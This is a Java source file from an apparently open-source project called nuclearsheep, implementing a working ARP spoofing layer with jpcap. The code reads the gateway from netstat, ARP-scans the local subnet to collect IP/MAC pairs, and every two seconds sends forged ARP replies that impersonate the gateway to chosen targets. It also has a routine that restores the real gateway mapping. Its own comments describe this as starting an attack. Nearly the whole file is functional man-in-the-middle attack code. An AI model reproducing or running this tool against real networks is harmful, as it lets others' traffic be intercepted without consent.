/*
 * Copyright Matt Corallo and Colin Arnott 2012
 * 
 * This file is part of nuclearsheep.
 *
 * nuclearsheep is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
 *
 * nuclearsheep is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with Foobar. If not, see http://www.gnu.org/licenses/.
 */

package org.hatchunc.nuclearsheep;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.StringTokenizer;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;

public class ARPSpoofLayer {
	class MACByteArrayWrapper {
		public byte[] mac;
		public MACByteArrayWrapper(byte[] mac) {
			this.mac = mac;
		}
		@Override
		public int hashCode() {
			int value = 0;
			for (int i = 0; i < mac.length; i++) {
				value *= 133;
				value += (int)(mac[i] & 0x000000ff);
			}
			return value;
		}
		@Override
		public boolean equals(Object other) {
			if (other == null || !(other instanceof MACByteArrayWrapper) ||
					((MACByteArrayWrapper)other).mac.length != this.mac.length)
				return false;
			for (int i = 0; i < this.mac.length; i++)
				if (((MACByteArrayWrapper)other).mac[i] != this.mac[i])
					return false;
			return true;
		}
	}
	
	private NetworkInterface device;
	private Map<MACByteArrayWrapper, Inet4Address> ips = new HashMap<MACByteArrayWrapper, Inet4Address>();
	private List<IPMACPair> spoofTargets = new LinkedList<IPMACPair>();
	private Object gatewayLock = new Object();
	private byte[] gatewayMAC = null;
	private byte[] gatewayIP = null;
	
	private byte[] longToByteArray(long ip) {
		return new byte[] {
				(byte) ((ip & 0xff000000L) >>> 8*3),
				(byte) ((ip & 0x00ff0000L) >>> 8*2),
				(byte) ((ip & 0x0000ff00L) >>> 8),
				(byte) (ip & 0x000000ffL)
		};
	}
	
	private void sendARPSpoofPackets(byte[] gatewayAddress, JpcapSender sender) {
		synchronized (spoofTargets) {
			for (IPMACPair addr : spoofTargets) {
				ARPPacket packet = new ARPPacket();
				
				EthernetPacket ether = new EthernetPacket();
				ether.frametype = EthernetPacket.ETHERTYPE_ARP;
				ether.src_mac = device.mac_address;
				ether.dst_mac = addr.mac;
				packet.datalink = ether;
				
				packet.hardtype = ARPPacket.HARDTYPE_ETHER;
				packet.prototype = ARPPacket.PROTOTYPE_IP;
				packet.hlen = 6;
				packet.plen = 4;
				packet.operation = ARPPacket.ARP_REPLY;
				packet.sender_hardaddr = device.mac_address;
				packet.sender_protoaddr = gatewayAddress;
				packet.target_hardaddr = addr.mac;
				packet.target_protoaddr = addr.ip.getAddress();
				
				synchronized (sender) {
					sender.sendPacket(packet);
				}
				
				packet.operation = ARPPacket.ARP_REQUEST;
				packet.target_hardaddr = new byte[] {0, 0, 0, 0, 0, 0};
				
				synchronized (sender) {
					sender.sendPacket(packet);
				}
			}
		}
	}
	
	/**
	 * Create a new ARPSpoofLayer which will start gathering a list of IP/MAC pairs on the local network.
	 * Note that this does an ARP ping across the local subnet, so you probably only want to use this on a /24, etc.
	 */
	public ARPSpoofLayer(final NetworkInterface device) throws IOException {
		this.device = device;
		
		// Find the gateway IP Address (OMG...UGLY code)
		// http://stackoverflow.com/questions/11930/how-can-i-determine-the-ip-of-my-router-gateway-in-java
		Process result = Runtime.getRuntime().exec("netstat -rn");
		BufferedReader output = new BufferedReader
				(new InputStreamReader(result.getInputStream()));
		String line = output.readLine();
		while(line != null){
			if (line.trim().startsWith("0.0.0.0") == true)
				break;
			line = output.readLine();
		}
		StringTokenizer st = new StringTokenizer(line);
		st.nextToken();
		if (System.getProperty("os.name").startsWith("Windows"))
			st.nextToken();
		final String gateway = st.nextToken();
		final Inet4Address gwAddress = (Inet4Address)InetAddress.getByName(gateway);
		gatewayIP = gwAddress.getAddress();
		
		final JpcapSender sender = JpcapSender.openDevice(device);
		
		// kick off a packet scanner
		final JpcapCaptor captor = JpcapCaptor.openDevice(device, 65535, true, -1);
		captor.setFilter("arp", true);
		new Thread(new Runnable() {
			public void run() {
				while (true) {
					Packet packet = captor.getPacket();
					if (packet instanceof ARPPacket) {
						if (((ARPPacket)packet).sender_hardaddr == device.mac_address)
							return;
						try {
							Inet4Address address = (Inet4Address)InetAddress.getByAddress(((ARPPacket)packet).sender_protoaddr);
							boolean skip = true;
							for (int i = 0; i < 4; i++)
								if (address.getAddress()[i] != 0) {
									skip = false;
									break;
								}
							if (skip)
								continue;
							if (address.equals(gwAddress)) {
								synchronized(gatewayLock) {
									if (gatewayMAC == null) {
										gatewayMAC = ((ARPPacket)packet).sender_hardaddr;
										gatewayLock.notify();
									}
									if (Arrays.equals(((ARPPacket)packet).sender_hardaddr, gatewayMAC))
										sendARPSpoofPackets(gatewayIP, sender);
								}
							} else {
								synchronized(ips) {
									boolean add = true;
									for (NetworkInterfaceAddress ifAddress : device.addresses)
										if (address.equals(ifAddress.address)) {
											add = false;
											break;
										}
									if (add)
										ips.put(new MACByteArrayWrapper(((ARPPacket)packet).sender_hardaddr), address);
								}
							}
						} catch (UnknownHostException e) {
							throw new RuntimeException(e); // Should never happen
						}
					}
				}
			}
		}).start();
		
		// force an arping to the gateway first
		{
			ARPPacket packet = new ARPPacket();
			
			EthernetPacket ether = new EthernetPacket();
			ether.frametype = EthernetPacket.ETHERTYPE_ARP;
			ether.src_mac = device.mac_address;
			ether.dst_mac = new byte[] {(byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff};
			packet.datalink = ether;
			
			packet.hardtype = ARPPacket.HARDTYPE_ETHER;
			packet.prototype = ARPPacket.PROTOTYPE_IP;
			packet.hlen = 6;
			packet.plen = 4;
			packet.operation = ARPPacket.ARP_REQUEST;
			packet.sender_hardaddr = device.mac_address;
			packet.sender_protoaddr = device.addresses[0].address.getAddress();
			packet.target_hardaddr = new byte[] {0, 0, 0, 0, 0, 0};
			packet.target_protoaddr = InetAddress.getByName(gateway).getAddress();
			synchronized (sender) {
				sender.sendPacket(packet);
			}
		}
		
		//kick off an arping thread
		new Thread(new Runnable() {
			public void run() {
				for (NetworkInterfaceAddress addr : device.addresses) {
					if (!(addr.address instanceof Inet4Address))
						continue;
					byte[] address = addr.address.getAddress();
					byte[] subnet = addr.subnet.getAddress();
					System.out.print(addr.subnet.toString() + " (");
					for (byte b : subnet)
						System.out.print((b & 0x000000ff) + " ");
					System.out.println(")");
					long addressLong = 0;
					long addrBase = 0;
					long numAddress = 0;
					for (int i = 0; i < address.length; i++) {
						numAddress *= 256;
						numAddress += (int) (~subnet[i] & 0x000000ff);
						addrBase *= 256;
						addrBase += (int) ((address[i] & subnet[i]) & 0x000000ff);
						addressLong *= 256;
						addressLong += (int) (address[i] & 0x000000ff);
					}
					for (int i = 0; i < numAddress; i++) {
						if (i + addrBase == addressLong)
							continue;
						
						ARPPacket packet = new ARPPacket();
						
						EthernetPacket ether = new EthernetPacket();
						ether.frametype = EthernetPacket.ETHERTYPE_ARP;
						ether.src_mac = device.mac_address;
						ether.dst_mac = new byte[] {(byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff};
						packet.datalink = ether;
						
						packet.hardtype = ARPPacket.HARDTYPE_ETHER;
						packet.prototype = ARPPacket.PROTOTYPE_IP;
						packet.hlen = 6;
						packet.plen = 4;
						packet.operation = ARPPacket.ARP_REQUEST;
						packet.sender_hardaddr = device.mac_address;
						packet.sender_protoaddr = address;
						packet.target_hardaddr = new byte[] {0, 0, 0, 0, 0, 0};
						packet.target_protoaddr = longToByteArray(i + addrBase);
						synchronized (sender) {
							sender.sendPacket(packet);
						}
					}
				}
			}
		}).start();
		
		// kick off the actual arp spoof thread
		new Thread(new Runnable() {
			public void run() {
				while (true) {
					byte[] gatewayIP;
					try {
						gatewayIP = InetAddress.getByName(gateway).getAddress();
					} catch (UnknownHostException e1) {
						throw new RuntimeException(e1); // This should never happen
					}
					sendARPSpoofPackets(gatewayIP, sender);
					try {
						Thread.sleep(2000);
					} catch (InterruptedException e) {
						return;
					}
				}
			}
		}).start();
	}
	
	/**
	 * Get the list of IP/MAC pairs we have seen
	 */
	public List<IPMACPair> getIPMACPairs() {
		List<IPMACPair> retVal = new LinkedList<IPMACPair>();
		synchronized(ips) {
			for (Map.Entry<MACByteArrayWrapper, Inet4Address> entry : ips.entrySet()) {
				retVal.add(new IPMACPair(entry.getKey().mac, entry.getValue()));
			}
		}
		return retVal;
	}
	
	/**
	 * Starts an ARP Spoof attack against the given list of IP/MAC pairs.
	 */
	public void startARPSpoof(List<IPMACPair> addressesToAttack) {
		synchronized(spoofTargets) {
			for (IPMACPair addr : addressesToAttack) {
				spoofTargets.add(addr);
			}
		}
	}
	
	/**
	 * Stop any active ARP Spoof attacks
	 * (this is necessary to reset the MAC of the router in clients so they don't get connection drops)
	 */
	public void stopARPSpoofs() throws IOException {
		synchronized(gatewayLock) {
			if (gatewayMAC == null)
				try {
					gatewayLock.wait();
				} catch (InterruptedException e) {
					throw new RuntimeException(e); // Who the FUCK killed us???
				}
		}
		final JpcapSender sender = JpcapSender.openDevice(this.device);
		synchronized(spoofTargets) {
			final List<ARPPacket> packets = new LinkedList<ARPPacket>();
			for (IPMACPair addr : spoofTargets) {
				ARPPacket packet = new ARPPacket();
				
				EthernetPacket ether = new EthernetPacket();
				ether.frametype = EthernetPacket.ETHERTYPE_ARP;
				ether.src_mac = device.mac_address; //TODO: device or gateway?
				ether.dst_mac = addr.mac;
				packet.datalink = ether;
				
				packet.hardtype = ARPPacket.HARDTYPE_ETHER;
				packet.prototype = ARPPacket.PROTOTYPE_IP;
				packet.hlen = 6;
				packet.plen = 4;
				packet.operation = ARPPacket.ARP_REPLY;
				synchronized(gatewayLock) {
					packet.sender_hardaddr = gatewayMAC;
					packet.sender_protoaddr = gatewayIP;
				}
				packet.target_hardaddr = addr.mac;
				packet.target_protoaddr = addr.ip.getAddress();
				synchronized (sender) {
					sender.sendPacket(packet);
				}
				packets.add(packet);
			}
			new Thread(new Runnable() {
				public void run() {
					try {
						Thread.sleep(1000);
					} catch (InterruptedException e) { }
					synchronized (sender) {
						for (ARPPacket packet : packets)
							sender.sendPacket(packet);
					}
				}
			}).start();
			spoofTargets.clear();
		}
	}

	/**
	 * Get a potential list of network interfaces to perform attacks on.
	 * (ie those which have a local network address)
	 */
	public static List<NetworkInterface> getPotentialInterfaces() {
		ArrayList<NetworkInterface> retVal = new ArrayList<NetworkInterface>();
		retVal.ensureCapacity(10);
		for (NetworkInterface device : JpcapCaptor.getDeviceList()) {
			if (device.loopback || !device.datalink_description.equals("Ethernet"))
				continue;
			for (NetworkInterfaceAddress addr : device.addresses) {
				if (addr.address instanceof Inet4Address) {
					retVal.add(device);
					continue;
				}
			}
		}
		return retVal;
	}
}
